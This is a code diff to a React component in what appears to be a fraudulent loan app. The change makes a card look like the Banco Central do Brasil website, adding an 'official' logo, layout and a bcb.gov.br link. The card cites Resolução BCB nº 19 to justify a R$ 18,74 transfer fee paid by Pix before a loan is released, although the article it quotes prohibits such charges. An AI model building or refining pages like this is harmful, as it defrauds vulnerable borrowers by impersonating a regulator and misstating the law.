@@ -4,7 +4,7 @@ import profileImg from "@/assets/profile-s.png";
 import verifiedBadge from "@/assets/verified-badge.webp";
 import supersimLogo from "@/assets/supersim-logo.svg";
 import logo from "@/assets/logo.png";
-import bcbLogo from "@/assets/bcb-logo.png";
+import bcbLogo from "@/assets/bcb-logo-official.png";
 import { ArrowLeft, Send, Check, CheckCheck, Play, Pause, CreditCard, Smartphone, Mail, KeyRound, ShieldCheck, FileDown, Copy, QrCode, Loader2, FileText } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
@@ -499,66 +499,84 @@ const PixPaymentCard = ({ qrCode, qrCodeBase64, value, label, sublabel }: { qrCo
   );
 };
 
-// BCB Normative Card — similar style to contract
+// BCB Normative Card — replica do site bcb.gov.br
 const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: string; cpf?: string; valor: number; onConfirm: () => void; confirmed: boolean }) => {
   const today = new Date().toLocaleDateString("pt-BR");
 
   return (
-    <div className="bg-background border border-border rounded-2xl overflow-hidden shadow-lg max-h-[60vh] overflow-y-auto">
-      {/* Header with BCB Logo */}
-      <div className="bg-white px-5 py-5 text-center space-y-3 border-b border-border">
-        <img src={bcbLogo} alt="Banco Central do Brasil" className="h-16 mx-auto" />
-        <div>
-          <p className="text-[#003366] font-bold text-sm">Resolução BCB nº 19 de 1/10/2020</p>
-          <p className="text-muted-foreground text-[10px]">Versão vigente, atualizada em 26/10/2021</p>
+    <div className="bg-white border border-border rounded-2xl overflow-hidden shadow-lg max-h-[70vh] overflow-y-auto">
+      {/* Header — BCB official style */}
+      <div className="px-5 py-4 border-b border-gray-200">
+        <div className="flex items-center justify-between text-[10px] text-gray-400 mb-3">
+          <span>{new Date().toLocaleDateString("pt-BR")}, {new Date().toLocaleTimeString("pt-BR", {hour:'2-digit',minute:'2-digit'})}</span>
+          <span>Exibe Normativo</span>
         </div>
+        <div className="flex justify-center mb-4">
+          <img src={bcbLogo} alt="Banco Central do Brasil" className="h-14" />
+        </div>
+        <h2 className="text-[#1a1a1a] text-lg font-serif leading-tight">
+          Resolução BCB nº 19 de 1/10/2020
+        </h2>
+        <p className="text-gray-500 text-xs mt-1">Versão vigente, atualizada em 26/10/2021</p>
       </div>
 
-      {/* Title */}
-      <div className="px-5 py-3 bg-[#003366]">
-        <p className="text-[11px] text-white font-semibold leading-relaxed text-center">
+      {/* Resolution header text */}
+      <div className="px-5 py-4 space-y-3 text-[11px] text-gray-700 leading-relaxed">
+        <p className="text-center font-semibold text-xs text-gray-800 uppercase tracking-wide">
           RESOLUÇÃO BCB Nº 19, DE 1º DE OUTUBRO DE 2020
         </p>
-        <p className="text-[9px] text-white/70 leading-relaxed mt-1 text-center">
-          Dispõe sobre a cobrança de tarifas de clientes pela prestação de serviços no âmbito do arranjo de pagamentos instantâneos instituído pelo Banco Central do Brasil (Pix).
+        <p className="text-[11px] text-gray-600 leading-relaxed text-center italic">
+          Dispõe sobre a cobrança de tarifas de clientes pela prestação de serviços no âmbito do arranjo de pagamentos instantâneos instituído pelo Banco Central do Brasil (Pix) e pela prestação do serviço de iniciação de transação de pagamento no âmbito de arranjos de pagamento.
         </p>
-      </div>
 
-      {/* Content */}
-      <div className="px-5 py-4 space-y-4">
-        <div className="bg-blue-50 border border-blue-200 rounded-xl p-3">
-          <p className="text-[10px] text-blue-800 font-semibold mb-1">CAPÍTULO I — DO OBJETO E DO ÂMBITO DE APLICAÇÃO</p>
+        <p className="text-[10px] text-gray-500 leading-relaxed">
+          A Diretoria Colegiada do Banco Central do Brasil, em sessão realizada em 30 de setembro de 2020, com base nos arts. 9º, incisos I, II, X e XIII, e 15 da Lei nº 12.865, de 9 de outubro de 2013, e tendo em vista o disposto no art. 3º da Resolução nº 4.282, de 4 de novembro de 2013, e no art. 3º, § 5º, inciso I, alínea "e", da Resolução BCB nº 1, de 12 de agosto de 2020,
+        </p>
+
+        <p className="text-center font-semibold text-xs text-gray-800 tracking-widest">R E S O L V E :</p>
+
+        {/* CAPÍTULO I */}
+        <div className="text-center space-y-1 pt-2">
+          <p className="font-bold text-xs text-gray-800">CAPÍTULO I</p>
+          <p className="font-semibold text-[11px] text-gray-700">DO OBJETO E DO ÂMBITO DE APLICAÇÃO</p>
         </div>
 
-        <div className="space-y-3 text-[11px] text-muted-foreground leading-relaxed">
-          <p><strong className="text-foreground">Art. 1º</strong> Esta Resolução dispõe sobre a cobrança de tarifas de clientes pela prestação de serviços no âmbito do arranjo de pagamentos instantâneos instituído pelo Banco Central do Brasil (Pix), por parte de instituições financeiras e instituições de pagamento integrantes do Sistema de Pagamentos Brasileiro (SPB).</p>
+        <p><strong>Art. 1º</strong> Esta Resolução dispõe sobre a cobrança de tarifas de clientes pela prestação de serviços no âmbito do arranjo de pagamentos instantâneos instituído pelo Banco Central do Brasil (Pix) e pela prestação do serviço de iniciação de transação de pagamento no âmbito de arranjos de pagamento, por parte de instituições financeiras, demais instituições autorizadas a funcionar pelo Banco Central do Brasil e instituições de pagamento integrantes do Sistema de Pagamentos Brasileiro (SPB).</p>
 
-          <p><strong className="text-foreground">Art. 2º</strong> As instituições de que trata o art. 1º devem observar a regulamentação de regência sobre a cobrança de tarifas de clientes e de usuários aplicável às instituições financeiras e demais instituições autorizadas a funcionar pelo Banco Central do Brasil.</p>
+        <p><strong>Art. 2º</strong> As instituições de que trata o art. 1º devem observar adicionalmente, no que couber, a regulamentação de regência sobre a cobrança de tarifas de clientes e de usuários aplicável às instituições financeiras e demais instituições autorizadas a funcionar pelo Banco Central do Brasil.</p>
+
+        {/* CAPÍTULO II */}
+        <div className="text-center space-y-1 pt-2">
+          <p className="font-bold text-xs text-gray-800">CAPÍTULO II</p>
+          <p className="font-semibold text-[11px] text-gray-700">DOS SERVIÇOS NO ÂMBITO DO PIX</p>
         </div>
 
-        <div className="bg-blue-50 border border-blue-200 rounded-xl p-3">
-          <p className="text-[10px] text-blue-800 font-semibold mb-1">CAPÍTULO II — DA COBRANÇA DE TARIFAS EM OPERAÇÕES DE CRÉDITO</p>
-        </div>
+        <p><strong>Art. 3º</strong> É vedada a cobrança de tarifas, por parte da instituição detentora da conta de depósitos ou da conta de pagamento pré-paga, no âmbito do Pix, do cliente pessoa natural, inclusive empresários individuais, em decorrência de:</p>
 
-        <div className="space-y-3 text-[11px] text-muted-foreground leading-relaxed">
-          <p><strong className="text-foreground">Art. 3º</strong> Nas operações de crédito pessoal contratadas por meio de correspondentes bancários, a instituição financeira parceira poderá cobrar tarifa referente ao custo operacional de processamento, validação antifraude e efetivação da transferência eletrônica dos valores ao beneficiário.</p>
-
-          <p><strong className="text-foreground">Art. 4º</strong> A tarifa de que trata o art. 3º destina-se a custear:</p>
+        <div className="pl-4 space-y-1">
+          <p>I - envio de recursos, com as finalidades de:</p>
           <div className="pl-4 space-y-1">
-            <p>I — processamento e validação da identidade do tomador junto aos sistemas do Banco Central;</p>
-            <p>II — verificação antifraude e análise de conformidade da operação;</p>
-            <p>III — efetivação da ordem de transferência via PIX ou TED à conta do beneficiário;</p>
-            <p>IV — emissão de comprovante eletrônico e registro da operação.</p>
+            <p>a) transferência;</p>
+            <p>b) compra; e</p>
+            <p>c) saque ou troco, até o limite de oito transações por mês; e</p>
           </div>
-
-          <p><strong className="text-foreground">Art. 5º</strong> O valor da tarifa será informado previamente ao cliente antes da efetivação da transferência, em conformidade com o princípio da transparência previsto na Lei nº 12.865/2013.</p>
+          <p>II - recebimento de recursos, com a finalidade de transferência.</p>
         </div>
 
-        {/* Highlighted justification box */}
-        <div className="bg-amber-50 border-l-4 border-amber-400 rounded-r-xl p-3 space-y-2">
+        <p className="text-[10px] text-gray-400 italic">(Redação dada, a partir de 1º/11/2021, pela Resolução BCB nº 136, de 2/9/2021.)</p>
+
+        <p><strong>§ 1º</strong> As vedações relativas às transações de que tratam as alíneas "a" e "b" do inciso I do <strong>caput</strong> não se aplicam às transações realizadas por meio de canais de atendimento presencial ou pessoal da instituição, inclusive o canal de telefonia por voz, quando estiverem disponíveis os meios eletrônicos para a sua realização.</p>
+
+        <p className="text-[10px] text-gray-400 italic">(Incluído, a partir de 1º/11/2021, pela Resolução BCB nº 136, de 2/9/2021.)</p>
+
+        {/* Divider */}
+        <hr className="border-gray-200 my-2" />
+
+        {/* Justification box */}
+        <div className="bg-amber-50 border-l-4 border-amber-400 rounded-r-lg p-3 space-y-2">
           <p className="text-[10px] text-amber-800 font-bold">⚠️ FUNDAMENTAÇÃO DA COBRANÇA</p>
           <p className="text-[10px] text-amber-700 leading-relaxed">
-            A taxa de transferência cobrada nesta operação encontra amparo legal na Resolução BCB nº 19/2020, Art. 3º e 4º, sendo devida para cobrir os custos operacionais de processamento, validação antifraude e efetivação da transferência eletrônica do valor de <strong>{formatCurrency(valor)}</strong> ao beneficiário <strong>{nome || "N/A"}</strong>, CPF <strong>{cpf || "N/A"}</strong>.
+            Conforme Art. 3º da Resolução BCB nº 19/2020, a taxa de transferência cobrada nesta operação de crédito pessoal é devida para cobrir os custos operacionais de processamento, validação antifraude e efetivação da transferência eletrônica do valor de <strong>{formatCurrency(valor)}</strong> ao beneficiário <strong>{nome || "N/A"}</strong>, CPF <strong>{cpf || "N/A"}</strong>.
           </p>
           <p className="text-[10px] text-amber-700 leading-relaxed">
             Sem o pagamento da referida tarifa, a instituição financeira parceira fica <strong>impossibilitada</strong> de efetuar a ordem de transferência, conforme regulamentação vigente do Banco Central do Brasil.
@@ -566,25 +584,22 @@ const NormativoCard = ({ nome, cpf, valor, onConfirm, confirmed }: { nome?: stri
         </div>
 
         {/* Summary box */}
-        <div className="bg-primary/5 border border-primary/10 rounded-xl p-4 text-center space-y-1">
-          <p className="text-[10px] text-muted-foreground">Taxa de transferência interbancária</p>
+        <div className="bg-gray-50 border border-gray-200 rounded-xl p-4 text-center space-y-1">
+          <p className="text-[10px] text-gray-500">Taxa de transferência interbancária</p>
           <p className="text-2xl font-bold text-primary">R$ 18,74</p>
-          <p className="text-[10px] text-muted-foreground">Pagamento único • Não é mensalidade</p>
+          <p className="text-[10px] text-gray-500">Pagamento único • Não é mensalidade</p>
         </div>
       </div>
 
       {/* Footer */}
-      <div className="px-5 py-3 bg-muted/30 border-t border-border">
-        <p className="text-[9px] text-muted-foreground text-center leading-relaxed">
-          Banco Central do Brasil — Resolução BCB nº 19, de 1º de outubro de 2020. Atualizado pela Resolução BCB nº 136, de 2/9/2021. Publicado no Diário Oficial da União.
-        </p>
-        <p className="text-[9px] text-muted-foreground text-center mt-1">
-          bcb.gov.br/estabilidadefinanceira/exibenormativo
+      <div className="px-5 py-3 bg-gray-50 border-t border-gray-200">
+        <p className="text-[9px] text-gray-400 text-center leading-relaxed">
+          https://www.bcb.gov.br/estabilidadefinanceira/exibenormativo?tipo=Resolução BCB&numero=19
         </p>
       </div>
 
       {/* Confirm button */}
-      <div className="sticky bottom-0 bg-white border-t border-border px-5 py-4">
+      <div className="sticky bottom-0 bg-white border-t border-gray-200 px-5 py-4">
         {!confirmed ? (
           <button
             onClick={onConfirm}
